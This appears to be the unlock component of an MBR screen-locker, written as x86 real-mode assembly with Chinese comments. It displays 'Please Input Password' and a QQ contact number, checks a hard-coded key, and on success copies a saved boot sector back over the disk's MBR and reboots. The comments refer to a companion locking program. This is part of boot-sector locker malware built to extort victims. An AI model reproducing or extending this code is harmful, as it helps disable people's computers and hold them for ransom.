org 0x7c00  ;这个是告诉编译器，我们的程序将会被加载到7c00这个位置，这个是BIOS负责的，我们管不了。
start: ;初始化寄存器的值
 mov ax,cs
 mov ds,ax ;是对ds,ss,es 段寄存器赋值 让他们都指向代码段。
 mov ss,ax
 mov es,ax
 mov sp,0x100 ;开辟0x100字节的堆栈空间
 ;----------------------------------------------------------------
 main:
	mov bp,msg1		;指向一个字符串  所以这个字符串可以不是以0结尾
	mov cx,msg1_Len ;里面存放字符串的长度
	mov ax,0x1301  ;这个是显示服务的具体功能描述。
	mov bx,0x0c    ;描述了页号(BH = 0)，BL描述了字体的样式(bl=0xc) 0xc 表示黑底红字 高亮等属性
	mov dl,0		;dl = 0
    int 0x10 ;调用BIOS的显示服务。
	;验证密码
  mov ax,0xb800 ;显示缓冲区
  add ax,0xA0   ;定位到第二行
  mov ds,ax		;ds的值为0xb8A0 也就是显示器的第二行。
  xor cx,cx     ;cx = 0
  xor bx,bx
  GetChar:
   xor ax,ax
   int 0x16		;键盘中断  具体请大家上百度查询
   cmp AL,0x8  ;退格键 if al==0x8
   je back
   CMP al,0x0d ;回车键
   je entry
   mov ah,2
   mov [bx],al
   mov [bx+1],ah
   add bx,2
   inc cx
   jmp GetChar
   back:
   sub bx,2
   dec cx
   xor ax,ax
   mov [bx],ax
   jmp  GetChar
   entry:
   ;逐个字符比较
   mov ax,cs
   mov es,ax
   xor bx,bx ;bx = 0
   mov si,Key  ;si 指向真正的密码   bx指向输入的密码
   mov cl,[cs:KeySize1]
   mov ch,0 ;cx
   cmp_key:
    mov al,[ds:bx] ;0xb8A0
	mov ah,[es:si]
	cmp al,ah
	jne key_err ;不相同,退出
	add bx,2 
	inc si
	loop cmp_key
	;密码验证正确，进行解密工作
	;读取
	xor ax,ax ;初始化
	mov ax,0x7e00
	mov es,ax
	xor bx,bx
	mov ah,0x2
	mov dl,0x80
	mov al,1  ;数量
	mov dh,0  ;磁头
	mov ch,0  ;柱面  ；CHS寻址方式
	mov cl,5  ;扇区  ；我们在写加锁程序的时候用的是 LBA寻址方式，LBA寻址方式扇区号从0开始，具体请百度
	int 0x13
	;写回去
	xor bx,bx
	mov dl,0x80
	mov ah,0x3
	mov al,1  ;数量
	mov dh,0  ;磁头
	mov ch,0  ;柱面
	mov cl,1  ;MBR扇区
	int 0x13
	jmp _REST  ;重启计算机
	key_err:
	mov bx,0xb800
	add bx,msg1_Len
	mov al,'X'
	mov [bx],al
   mov cx,[cs:KeySize1]
   xor ax,ax
   kk:  ;对输入的清0
    mov [bx],ax
	add bx,2
   loop kk
  jmp start
  ;重启计算机
_REST:
mov ax,0xffff
push ax
mov ax,0
push ax
retf
data:
msg1:db "Unlock",0AH,0DH
msg2:db "Please Input Password",0AH,0DH
msg3:db "QQ:3325395619"
msg1_Len equ  $-msg1
msg2_Len equ  $-msg2
msg3_Len equ  $-msg3
KeySize1:db 9
Key:db 'yinshaoze' ;也不能有中文
times 510-($-$$)  db 0xF
dw 0xAA55